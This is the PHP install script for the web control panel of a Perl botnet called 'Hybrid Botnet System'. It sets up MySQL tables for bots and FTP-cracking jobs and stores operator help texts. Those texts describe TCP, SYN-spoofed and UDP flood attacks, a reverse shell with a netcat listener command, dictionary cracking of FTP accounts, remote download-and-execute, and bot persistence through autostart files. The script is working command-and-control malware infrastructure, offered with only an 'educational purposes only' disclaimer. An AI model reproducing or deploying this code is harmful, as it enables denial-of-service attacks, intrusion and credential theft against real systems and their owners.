<?php 
if(!is_null($_POST['action'])){ 
/********************************************************************/ 
	$db_host = htmlspecialchars(addslashes($_POST['db_host']));
	$db_user = htmlspecialchars(addslashes($_POST['db_user']));
	$db_pass = htmlspecialchars(addslashes($_POST['db_pass']));
	$db = htmlspecialchars(addslashes($_POST['db']));
	$table = "bots";
	$help_table = "help_table";
	$ftp_table = "ftp_table";
	$table_erte_configuration = "erte_configuration";
/********************************************************************/
$about = "
Hybrid Remote Administration System / Hybrid Botnet System 
version 1.0 by cross [cross@x1machine.com] 
Web Site: www.x1machine.com 
Hybrid Botnet System consists of this web control panel and 
Hybrid Bot, which is written in perl scripting language. 
Hybrid is probably the first perl bot controlled via http 
protocol. This version uses only one standard perl module: Socket, 
so it will run on any linux system with perl interpreter installed.
Moreover, you can compile Hybrid Bot with perl2exe application, it 
should then be able to run on any linux systems. 
Web panel license: Creative Commons v.2.0 
Hybrid Bot License: GPL v.2.1. 
Author of this software is not responsible for anything. 
Hybrid Botnet System is released for educational purposes only! 
";

$terminal_about = "
Encrypted Remote Terminal Emulator. 
Base64 encryption algorythm used here. Anyways, what it is for? 
This is shell emulation via web panel. How you can use it and when?
You can use it if bot has external ip or port redirected for processing such 
connection. How to use it? At the very bottom you can see some settings. 
So, first, set command for bot and let is open port for connection. 
Then set configuration for E.R.T.E. by selecting IP Address from available 
bots, typing port number and hitting [Set Configuration] button. You should 
see the configuration, now just type commands. In previous Hybrid Botnet 
version this was implemented as separate perl::Gtk2 application.
";

$stats_about = "
Here you can observe your botnet, setting commands to bots, deleting bots.
Anyways, every outdated bot will be deleted automatically so dont bother. 
Time is set to 600 seconds, after - bot is deleted. Dont worry anyway, if 
bot is just went offline for some time - it will be added to database next time
it will connect to it. How do you setting commands? You probably already know, but if not:
select bot name, or All Bots option, or Checked option. As you have noticed already, 
there is posibility to check a few bots at ones, so for example if you want 
to strike with denial of service attack and want to use a few bots for this, just check 
these bots you want to use, select Checked option, select command, type arguments and
hit [Set Command] button.
";

$hygen_about = "
Well, this is actually a new HyGen, which first version was implemented in Hybrid 
Botnet System version 0.1, very first version. Here you are editing various settings.
Base Bot Name - whatever you want, will be mixed with login and random string
Directory to place bot - /bin/, /usr/local/bin/, /sbin/, or /temp/?
Default Sleep Time - as it states, how long to sleep while there is no command
Home Server - your domain actually, like www.youdomain.com, or server ip
Home Server Port - in case you are running web server on non-standard port 
Gate Dir - currently folder with this script
Gate Script - name of gate script (now: getcmd.php)
Bots User Agent - this is importand when you, for example, want to allow only custom user agents 
Autostart File - file responsible for daemons autostart with system, can be /etc/profile
While you have completed all fields just hit [Generate] button and youll get you 
fresh and new bot.
";

$dict_about = "
Here you can upload new dictionary files, used then for ftp accounts cracking.
Max Upload Size - how big file could be, you can upload such file via ftp client 
Max Post Size - size of file that could be uploaded via web form
Select new dictionary file - select some new dictionary file from your computer
[Upload] - upload dictionary file to server.
When you will have some files on server - you will see them, you can delete 
then files you want. You should upload a few dictionary files before 
try to crack any ftp.
";

$ftpcrack_about = "
Here you can set up ftp hosts you want to try to crack. How are you doing this:
type ftp address (IP), type port and select a dictionary file from 
available, hit [Add] button then. You can add here any amount of ftp cracking jobs.
When you have added something here, you can now issue a command for bots to start 
cracking these ftp accounts. More about this command you can read in apropriate section.
";

/********************************************************************/
$sleep_cmd_help = "
Sleep-[time(in secs)]
Set up Sleep command if you want you specific bot or all bots to go sleep.
That means, for specified period of time bot(s) will stay inactive.
Second argument is time in seconds, for example:
Sleep 15 - bot will sleep for 15 seconds.
Sleep 3600 - bot will sleep for an hour.
";

$tcpstorm_cmd_help = "
TCP Storm help section. 
TCP Storm is simple yet powerfull tcp flooder against most servers and services. 
Unfortunately, it is very easy to block, it doesnt spoof bot ip, etc. 
There are arguments: Host, Port, Delay, Packets. 
Host - is target host we want to attack, 
Port - is service port we want to attack (http - 80, ftp - 21, etc), 
Delay - 0 : max power / 100% cpu usage, 1 - min power / 1-5%  of cpu, 
Packets - how many connections to make. 
";

$synstorm_cmd_help = "
SYN Storm help section. 
SYN Storm command is responsible for launching syn flood on target machine. 
syn flood was very powerful attack some time ago, now it can be easily blocked.
But still here there is, with source ip spoofing. 
Arguments are the mostely same like for TCPStorm command: 
Host - is target host we want to attack, 
Port - is service port we want to attack (http - 80, ftp - 21, etc), 
Delay - 0 : max power / 100% cpu usage, 1 - min power / 1-5%  of cpu, 
Packets - how many packets to send. 
Notice: you bot need to be run under root to use raw sockets, used for 
this kind of attack. 
";

$udp_cmd_help = "
UDP Storm Bot help section. 
Thats simple udp flood attack against services utilizing networking functions via udp protocol.
UDP Storm sends a lot of trash data on specified udp port, there are 4 arguments:
Host - target host 
Port - opened udp port on target host
Time - how long to attack (in seconds) 
Delay - 0 - max / 1 - min. 
";

$delbot_cmd_help = "
Delete Bot help section. 
This command will simply result in bot deletion from its host machine. 
";

$revsh_cmd_help = "
Reverse Shell help section. 
This is simple reverse shell. There are 2 arguments for this command:
Host and Port, where host is your computers ip and port, opened on your
computer for processing remote shell. To open port on your computer, use netcat utility: 
[nc -l -v -p 6666] - this will open port 6666 for shell. When port has been opened, 
you can set the Reverse SHell command for bot. Notice: You need external ip or 
port redirected to use this shell.
";


$erte_cmd_help = "
Encrypted Remote Terminal Emulator help section.
E.R.T.E is a main page in this control panel, you can see
terminal like window there. So, to establish a connection
with bot from web terminal, first thing - bot should have
external IP or redirected port in router. Else, you cannot use this
function. Assuming bot meets the requirements: 
the argument for this command is [Bots Port] - that is the port, 
which will be used for receiving data (commands).
For example, you have sat port to be 12345, now go to web terminal.
YOu have to Set Configuration first. Here you simply select bot ip
and type port in a field below and hit [Set Configuration].
You will see your configuration a bit above. Thats all.
Type commands in web terminal - results should be sent right away.
To exit E.R.T.E. - send [exit] command (without brackets).
";

$ftpcrack_cmd_help = "
FTP Crack help section. 
This command is responsible for ordering some bot to crack some ftp, simple as it gets.
Now, you cannot set up this command for All / Checked bots - only for one bot.
One ftp cracking job for one bot. To set this command sellect it from command 
selection menu and as an argument type ip address of ftp host you want your bot 
try to crack. Simple, copy some ip from Ftp Cracking Jobs and paste it here. 
Notice, this ftp MUST exist in ftp cracking jobs.
";

$dlexec_cmd_help = "
Download and Execute help section. 
This command will order your bot to download and execute some file. 
This could be binary executable (elf) file, or perl script - any file that could be 
executed without any additional arguments. Only regular sockets used, so no external 
application needed. Arguments: 
Remote Host - where file is located (ex. www.mydomain.com) 
Path 2 File - path to file (ex. /uploads/file)
Local File - path and name together, where file should be saved (ex. /usr/local/bin/file).
";
/********************************************************************/

function connect($h, $l, $p) {
$c=mysql_connect($h,$l,$p);
if ($c===FALSE){  
				die('connection to database failed!<br>');
			}}

connect($db_host, $db_user, $db_pass);

$STATUS = mysql_select_db($db); 
				if(!$STATUS){
					echo "ERROR: ". mysql_error()."<br>";					
					}
					
	$install = "CREATE TABLE `$table` (".
				  "`id` int(10) NOT NULL auto_increment,".
				  "`ip` varchar(100) NOT NULL default '',".
				  "`period` varchar(100) NOT NULL default '',".  
				  "`cmd` varchar(100) NOT NULL default '',".
				  "`name` varchar(100) NOT NULL default '',".
				  "`msg` varchar(100) NOT NULL default '',".
				  " PRIMARY KEY (`id`),". 
				  " UNIQUE KEY `id`(`id`)".
				  ") ENGINE=MyISAM COMMENT='' AUTO_INCREMENT=1 ;";
 
$STATUS = mysql_query($install);
				if(!$STATUS){
					echo "ERROR: ". mysql_error()."<br>";					
					}
/***********************************************************************/
	$install_config = "CREATE TABLE `$table_erte_configuration` (".
				  "`id` int(10) NOT NULL auto_increment,".
				  "`ip` varchar(100) NOT NULL default '',". // 1
				  "`port` varchar(100) NOT NULL default '',".  // 2
				  " PRIMARY KEY (`id`),". 
				  " UNIQUE KEY `id`(`id`)".
				  ") ENGINE=MyISAM COMMENT='' AUTO_INCREMENT=1 ;";
				  
$STATUS = mysql_query($install_config);
				if(!$STATUS){
					echo "ERROR: ". mysql_error()."<br>";					
					}
/**********************************************************************/
	$install_ftp = "CREATE TABLE `$ftp_table` (".
				  "`id` int(10) NOT NULL auto_increment,".
				  "`ip` varchar(100) NOT NULL default '',". // 1
				  "`port` varchar(100) NOT NULL default '',".  // 2
				  "`dict` varchar(100) NOT NULL default '',".  // 3
				  "`result` varchar(1000) NOT NULL default '',". // 4
				  " PRIMARY KEY (`id`),". 
				  " UNIQUE KEY `id`(`id`)".
				  ") ENGINE=MyISAM COMMENT='' AUTO_INCREMENT=1 ;";
				  
$STATUS = mysql_query($install_ftp);
				if(!$STATUS){
					echo "ERROR: ". mysql_error()."<br>";					
					}
/**********************************************************************/
	$install_help = "CREATE TABLE `$help_table` (".
				  "`id` int(10) NOT NULL auto_increment,".
				  "`about` longtext NOT NULL default '',". // 1
				  "`terminal_about` longtext NOT NULL default '',". // 2 
				  "`stats_about` longtext NOT NULL default '',".  // 3
				  "`hygen_about` longtext NOT NULL default '',". // 4
				  "`dict_about` longtext NOT NULL default '',". // 5
				  "`ftpcrack_about` longtext NOT NULL default '',". // 6
				  "`sleep_cmd_help` longtext NOT NULL default '',". // 7
				  "`tcpstorm_cmd_help` longtext NOT NULL default '',". // 8
				  "`synstorm_cmd_help` longtext NOT NULL default '',". // 9
				  "`udp_cmd_help` longtext NOT NULL default '',". /// 10 
				  "`delbot_cmd_help` longtext NOT NULL default '',". // 11
				  "`revsh_cmd_help` longtext NOT NULL default '',". // 12
				  "`erte_cmd_help` longtext NOT NULL default '',". // 13
				  "`ftpcrack_cmd_help` longtext NOT NULL default '',". // 14
				  "`dlexec_cmd_help` longtext NOT NULL default '',". //15 
				  " PRIMARY KEY (`id`),". 
				  " UNIQUE KEY `id`(`id`)".
				  ") ENGINE=MyISAM COMMENT='' AUTO_INCREMENT=1 ;";
				  
$STATUS = mysql_query($install_help);
				if(!$STATUS){
					echo "ERROR: ". mysql_error()."<br>";					
					}
		$STATUS = mysql_query("INSERT INTO $help_table (about, terminal_about, stats_about, hygen_about,
										dict_about, ftpcrack_about, sleep_cmd_help, tcpstorm_cmd_help,
										synstorm_cmd_help, udp_cmd_help, delbot_cmd_help, revsh_cmd_help,
										erte_cmd_help, ftpcrack_cmd_help, dlexec_cmd_help) VALUES ('$about', 
										'$terminal_about', '$stats_about', '$hygen_about',
										'$dict_about', '$ftpcrack_about', '$sleep_cmd_help', '$tcpstorm_cmd_help', 
										'$synstorm_cmd_help', '$udp_cmd_help', '$delbot_cmd_help', '$revsh_cmd_help',
										'$erte_cmd_help', '$ftpcrack_cmd_help', '$dlexec_cmd_help')");
				if(!$STATUS){
					echo "ERROR: ". mysql_error()."<br>";					
					}
/**********************************************************************

***********************************************************************/
	$config_file = "cf.php";
	$handle = fopen($config_file, 'w') or 
	die ("<br>Could not create configuration file! ERROR!<br>");
	$data = "<?php
	\$db_host = \"$db_host\";
	\$db = \"$db\";
	\$db_user = \"$db_user\";
	\$db_pass = \"$db_pass\";
	\$table = \"$table\";
	\$help_table = \"$help_table\";
	\$ftp_table = \"$ftp_table\";
	\$table_erte_configuration = \"$table_erte_configuration\";
?>
	";
	fwrite($handle, $data);
	fclose($handle);
/**********************************************************************/
//unlink("index.html"); 
mysql_close();
header('Location: index.php');
}
?> 
